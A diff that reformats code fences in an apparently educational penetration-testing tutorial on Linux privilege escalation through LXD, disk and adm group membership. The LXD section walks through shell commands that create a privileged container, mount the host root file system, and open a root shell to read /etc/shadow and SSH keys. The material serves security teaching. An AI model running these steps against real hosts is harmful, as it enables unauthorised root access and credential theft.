@@ -6,8 +6,7 @@
 
 LXD is similar to Docker and is Ubuntu's container manager. Upon installation, all users are added to the LXD group. Membership of this group can be used to escalate privileges by creating an LXD container, making it privileged, and then accessing the host file system at `/mnt/root`. Let's confirm group membership and use these rights to escalate to root.
 
-```
-        shellsession
+```shellsession
 devops@NIX02:~$ id
 
 uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
@@ -15,8 +14,7 @@ uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
 
 Unzip the Alpine image.
 
-```
-        shellsession
+```shellsession
 devops@NIX02:~$ unzip alpine.zip 
 
 Archive:  alpine.zip
@@ -27,8 +25,7 @@ cd 64-bit\ Alpine/
 
 Start the LXD initialization process. Choose the defaults for each prompt. Consult this [post](https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04) for more information on each step.
 
-```
-        shellsession
+```shellsession
 devops@NIX02:~$ lxd init
 
 Do you want to configure a new storage pool (yes/no) [default=yes]? yes
@@ -42,8 +39,7 @@ error: Failed to configure the bridge
 
 Import the local image.
 
-```
-        shellsession
+```shellsession
 devops@NIX02:~$ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
 
 Generating a client certificate. This may take a minute...
@@ -55,8 +51,7 @@ Image imported with fingerprint: be1ed370b16f6f3d63946d47eb57f8e04c77248c23f47a4
 
 Start a privileged container with the `security.privileged` set to `true` to run the container without a UID mapping, making the root user in the container the same as the root user on the host.
 
-```
-        shellsession
+```shellsession
 devops@NIX02:~$ lxc init alpine r00t -c security.privileged=true
 
 Creating r00t
@@ -64,8 +59,7 @@ Creating r00t
 
 Mount the host file system.
 
-```
-        shellsession
+```shellsession
 devops@NIX02:~$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
 
 Device mydev added to r00t
@@ -73,8 +67,7 @@ Device mydev added to r00t
 
 Finally, spawn a shell inside the container instance. We can now browse the mounted host file system as root. For example, to access the contents of the root directory on the host type `cd /mnt/root/root`. From here we can read sensitive files such as `/etc/shadow` and obtain password hashes or gain access to SSH keys in order to connect to the host system as root, and more.
 
-```
-        shellsession
+```shellsession
 devops@NIX02:~$ lxc start r00t
 devops@NIX02:~/64-bit Alpine$ lxc exec r00t /bin/sh
 
@@ -101,8 +94,7 @@ Users within the disk group have full access to any devices contained within `/d
 
 Members of the adm group are able to read all logs stored in `/var/log`. This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.
 
-```
-        shellsession
+```shellsession
 secaudit@NIX02:~$ id
 
 uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)
